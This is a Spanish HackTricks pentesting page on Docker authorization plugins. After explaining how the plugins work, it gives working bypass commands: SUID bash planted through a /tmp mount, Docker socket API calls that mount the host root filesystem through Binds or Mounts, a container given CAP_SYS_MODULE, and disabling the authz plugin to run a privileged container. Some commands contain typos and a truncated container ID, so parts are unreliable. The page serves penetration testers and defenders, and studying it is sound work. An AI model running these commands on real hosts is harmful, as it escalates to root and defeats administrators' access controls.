<details>

<summary><strong>Aprende hacking en AWS desde cero hasta experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Descubre [**La Familia PEASS**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>


El modelo de **autorización** predeterminado de **Docker** es de **todo o nada**. Cualquier usuario con permiso para acceder al demonio de Docker puede **ejecutar cualquier** comando de cliente de Docker. Lo mismo ocurre para los que utilizan la API del Motor de Docker para contactar con el demonio. Si necesitas un **mayor control de acceso**, puedes crear **plugins de autorización** y añadirlos a la configuración de tu demonio de Docker. Utilizando un plugin de autorización, un administrador de Docker puede **configurar políticas de acceso granulares** para gestionar el acceso al demonio de Docker.

# Arquitectura básica

Los plugins de autenticación de Docker son **plugins externos** que puedes utilizar para **permitir/denegar** **acciones** solicitadas al Demonio de Docker **dependiendo** del **usuario** que lo solicitó y de la **acción** **solicitada**.

**[La siguiente información es de la documentación](https://docs.docker.com/engine/extend/plugins_authorization/#:~:text=If%20you%20require%20greater%20access,access%20to%20the%20Docker%20daemon)**

Cuando se realiza una **solicitud HTTP** al demonio de Docker a través de la CLI o mediante la API del Motor, el **subsistema de autenticación** **pasa** la solicitud al o los **plugins de autenticación** instalados. La solicitud contiene el usuario (llamante) y el contexto del comando. El **plugin** es responsable de decidir si **permitir** o **denegar** la solicitud.

Los diagramas de secuencia a continuación representan un flujo de autorización de permitir y denegar:

![Flujo de autorización Permitir](https://docs.docker.com/engine/extend/images/authz\_allow.png)

![Flujo de autorización Denegar](https://docs.docker.com/engine/extend/images/authz\_deny.png)

Cada solicitud enviada al plugin **incluye el usuario autenticado, las cabeceras HTTP y el cuerpo de la solicitud/respuesta**. Solo se pasan al plugin el **nombre de usuario** y el **método de autenticación** utilizado. Es importante destacar que **no** se pasan **credenciales** de usuario ni tokens. Por último, **no todos los cuerpos de solicitud/respuesta se envían** al plugin de autorización. Solo aquellos cuerpos de solicitud/respuesta donde el `Content-Type` sea `text/*` o `application/json` se envían.

Para comandos que potencialmente pueden secuestrar la conexión HTTP (`Actualización HTTP`), como `exec`, el plugin de autorización solo se llama para las solicitudes HTTP iniciales. Una vez que el plugin aprueba el comando, la autorización no se aplica al resto del flujo. Específicamente, los datos de transmisión no se pasan a los plugins de autorización. Para comandos que devuelven una respuesta HTTP fragmentada, como `logs` y `events`, solo se envía la solicitud HTTP a los plugins de autorización.

Durante el procesamiento de solicitud/respuesta, algunos flujos de autorización pueden necesitar realizar consultas adicionales al demonio de Docker. Para completar dichos flujos, los plugins pueden llamar a la API del demonio de manera similar a un usuario regular. Para habilitar estas consultas adicionales, el plugin debe proporcionar los medios para que un administrador configure políticas de autenticación y seguridad adecuadas.

## Varios Plugins

Eres responsable de **registrar** tu **plugin** como parte del **inicio** del demonio de Docker. Puedes instalar **múltiples plugins y encadenarlos** juntos. Esta cadena puede estar ordenada. Cada solicitud al demonio pasa en orden a través de la cadena. Solo cuando **todos los plugins otorgan acceso** al recurso, se otorga el acceso.

# Ejemplos de Plugins

## Twistlock AuthZ Broker

El plugin [**authz**](https://github.com/twistlock/authz) te permite crear un simple archivo **JSON** que el **plugin** leerá para autorizar las solicitudes. Por lo tanto, te brinda la oportunidad de controlar de manera muy sencilla qué puntos finales de API pueden alcanzar cada usuario.

Este es un ejemplo que permitirá que Alice y Bob puedan crear nuevos contenedores: `{"name":"policy_3","users":["alice","bob"],"actions":["container_create"]}`

En la página [route\_parser.go](https://github.com/twistlock/authz/blob/master/core/route\_parser.go) puedes encontrar la relación entre la URL solicitada y la acción. En la página [types.go](https://github.com/twistlock/authz/blob/master/core/types.go) puedes encontrar la relación entre el nombre de la acción y la acción.

## Tutorial de Plugin Simple

Puedes encontrar un **plugin fácil de entender** con información detallada sobre la instalación y la depuración aquí: [**https://github.com/carlospolop-forks/authobot**](https://github.com/carlospolop-forks/authobot)

Lee el `README` y el código `plugin.go` para entender cómo funciona.

# Bypass de Plugin de Autenticación de Docker

## Enumerar acceso

Las principales cosas a verificar son **qué puntos finales están permitidos** y **qué valores de HostConfig están permitidos**.

Para realizar esta enumeración puedes **utilizar la herramienta** [**https://github.com/carlospolop/docker\_auth\_profiler**](https://github.com/carlospolop/docker\_auth\_profiler)**.**

## `run --privileged` no permitido

### Privilegios Mínimos
```bash
docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash
```
### Ejecutando un contenedor y luego obteniendo una sesión privilegiada

En este caso, el sysadmin **prohibió a los usuarios montar volúmenes y ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad adicional al contenedor:
```bash
docker run -d --privileged modified-ubuntu
docker: Error response from daemon: authorization denied by plugin customauth: [DOCKER FIREWALL] Specified Privileged option value is Disallowed.
See 'docker run --help'.
```
Sin embargo, un usuario puede **crear una shell dentro del contenedor en ejecución y otorgarle privilegios adicionales**:
```bash
docker run -d --security-opt seccomp=unconfined --security-opt apparmor=unconfined ubuntu
#bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de

# Now you can run a shell with --privileged
docker exec -it privileged bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4f1de bash
# With --cap-add=ALL
docker exec -it ---cap-add=ALL bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
# With --cap-add=SYS_ADMIN
docker exec -it ---cap-add=SYS_ADMIN bb72293810b0f4ea65ee8fd200db418a48593c1a8a31407be6fee0f9f3e4 bash
```
Ahora, el usuario puede escapar del contenedor utilizando cualquiera de las **técnicas previamente discutidas** y **escalar privilegios** dentro del host.

## Montar Carpeta Escribible

En este caso, el administrador del sistema **prohibió a los usuarios ejecutar contenedores con la bandera `--privileged`** o dar cualquier capacidad adicional al contenedor, y solo permitió montar la carpeta `/tmp`:
```bash
host> cp /bin/bash /tmp #Cerate a copy of bash
host> docker run -it -v /tmp:/host ubuntu:18.04 bash #Mount the /tmp folder of the host and get a shell
docker container> chown root:root /host/bash
docker container> chmod u+s /host/bash
host> /tmp/bash
-p #This will give you a shell as root
```
{% hint style="info" %}
Ten en cuenta que quizás no puedas montar la carpeta `/tmp`, pero puedes montar una **carpeta diferente con permisos de escritura**. Puedes encontrar directorios con permisos de escritura usando: `find / -writable -type d 2>/dev/null`

**¡Ten en cuenta que no todos los directorios en una máquina Linux admitirán el bit suid!** Para verificar qué directorios admiten el bit suid, ejecuta `mount | grep -v "nosuid"`. Por ejemplo, generalmente `/dev/shm`, `/run`, `/proc`, `/sys/fs/cgroup` y `/var/lib/lxcfs` no admiten el bit suid.

También ten en cuenta que si puedes **montar `/etc`** u otra carpeta **que contenga archivos de configuración**, puedes modificarlos desde el contenedor de Docker como root para **abusar de ellos en el host** y escalar privilegios (quizás modificando `/etc/shadow`).
{% endhint %}

## Punto de conexión de API no verificado

La responsabilidad del sysadmin al configurar este complemento sería controlar qué acciones y con qué privilegios puede realizar cada usuario. Por lo tanto, si el administrador adopta un enfoque de **lista negra** con los puntos de conexión y los atributos, podría **olvidar algunos** que podrían permitir a un atacante **escalar privilegios**.

Puedes consultar la API de Docker en [https://docs.docker.com/engine/api/v1.40/#](https://docs.docker.com/engine/api/v1.40/#)

## Estructura JSON no verificada

### Vinculaciones en la raíz

Es posible que cuando el sysadmin configuró el firewall de Docker, **olvidara algún parámetro importante** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Vinculaciones**".\
En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor que monta la carpeta raíz (/) del host:
```bash
docker version #First, find the API version of docker, 1.40 in this example
docker images #List the images available
#Then, a container that mounts the root folder of the host
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "Binds":["/:/host"]}' http:/v1.40/containers/create
docker start f6932bc153ad #Start the created privileged container
docker exec -it f6932bc153ad chroot /host bash #Get a shell inside of it
#You can access the host filesystem
```
{% hint style="warning" %}
Ten en cuenta cómo en este ejemplo estamos usando el parámetro **`Binds`** como una clave de nivel raíz en el JSON, pero en la API aparece bajo la clave **`HostConfig`**
{% endhint %}

### Vínculos en HostConfig

Sigue las mismas instrucciones que con **Vínculos en raíz** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Binds":["/:/host"]}}' http:/v1.40/containers/create
```
### Montajes en la raíz

Siga las mismas instrucciones que con **Vínculos en la raíz** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}' http:/v1.40/containers/create
```
### Montajes en HostConfig

Siga las mismas instrucciones que con **Vínculos en root** realizando esta **solicitud** a la API de Docker:
```bash
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu-sleep", "HostConfig":{"Mounts": [{"Name": "fac36212380535", "Source": "/", "Destination": "/host", "Driver": "local", "Mode": "rw,Z", "RW": true, "Propagation": "", "Type": "bind", "Target": "/host"}]}}' http:/v1.40/containers/cre
```
## Atributo JSON no verificado

Es posible que cuando el sysadmin configuró el firewall de Docker, **olvidó algún atributo importante de un parámetro** de la [**API**](https://docs.docker.com/engine/api/v1.40/#operation/ContainerList) como "**Capabilities**" dentro de "**HostConfig**". En el siguiente ejemplo, es posible abusar de esta mala configuración para crear y ejecutar un contenedor con la capacidad **SYS_MODULE**:
```bash
docker version
curl --unix-socket /var/run/docker.sock -H "Content-Type: application/json" -d '{"Image": "ubuntu", "HostConfig":{"Capabilities":["CAP_SYS_MODULE"]}}' http:/v1.40/containers/create
docker start c52a77629a9112450f3dedd1ad94ded17db61244c4249bdfbd6bb3d581f470fa
docker ps
docker exec -it c52a77629a91 bash
capsh --print
#You can abuse the SYS_MODULE capability
```
{% hint style="info" %}
El **`HostConfig`** es la clave que generalmente contiene los **privilegios** **interesantes** para escapar del contenedor. Sin embargo, como hemos discutido anteriormente, ten en cuenta cómo el uso de Binds fuera de él también funciona y puede permitirte evadir restricciones.
{% endhint %}

## Deshabilitar el Plugin

Si el **administrador del sistema** ha **olvidado** **prohibir** la capacidad de **desactivar** el **plugin**, ¡puedes aprovechar esto para desactivarlo por completo!
```bash
docker plugin list #Enumerate plugins

# If you don’t have access to enumerate the plugins you can see the name of the plugin in the error output:
docker: Error response from daemon: authorization denied by plugin authobot:latest: use of Privileged containers is not allowed.
# "authbolt" is the name of the previous plugin

docker plugin disable authobot
docker run --rm -it --privileged -v /:/host ubuntu bash
docker plugin enable authobot
```
Recuerda **volver a habilitar el plugin después de escalar**, ¡o un **reinicio del servicio de docker no funcionará**!

## Informes de evasión del plugin de autorización

* [https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/](https://staaldraad.github.io/post/2019-07-11-bypass-docker-plugin-with-containerd/)

# Referencias

* [https://docs.docker.com/engine/extend/plugins\_authorization/](https://docs.docker.com/engine/extend/plugins\_authorization/)


<details>

<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Otras formas de apoyar a HackTricks:

* Si quieres ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF** ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **sígueme** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
